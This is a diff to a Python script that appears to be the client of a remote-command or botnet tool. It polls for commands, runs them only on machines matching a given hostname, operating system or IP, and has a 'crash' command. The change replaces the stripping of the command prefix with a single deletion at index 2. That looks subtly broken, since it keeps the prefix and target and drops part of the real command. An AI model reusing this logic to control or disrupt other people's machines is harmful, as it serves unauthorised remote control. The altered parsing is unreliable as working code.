@@ -107,18 +107,15 @@ while True:
                 if command.startswith("exename "):
                     localcmd = command.split()
                     if localcmd[1] == hostname:
-                        del localcmd[0]
-                        del localcmd[0]
+                        del localcmd[2]
                         localcmd = ' '.join(localcmd)
-                        print(localcmd)
                     else:
                         old_command = commandId
                         continue
                 if command.startswith("exeos "):
                     localcmd = command.split()
                     if localcmd[1] == platform:
-                        del localcmd[0]
-                        del localcmd[0]
+                        del localcmd[2]
                         localcmd = ' '.join(localcmd)
                     else:
                         old_command = commandId
@@ -126,10 +123,9 @@ while True:
                 if command.startswith("exeip "):
                     localcmd = command.split()
                     if localcmd[1] == ip:
-                        del localcmd[0]
-                        del localcmd[0]
+                        del localcmd[2]
                         localcmd = ' '.join(localcmd)
-                    else: 
+                    else:
                         old_command = commandId
                         continue
                 if command.startswith("crash"):
